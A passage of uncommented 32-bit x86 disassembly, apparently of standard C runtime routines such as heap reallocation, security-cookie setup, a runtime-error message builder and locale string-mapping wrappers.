  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
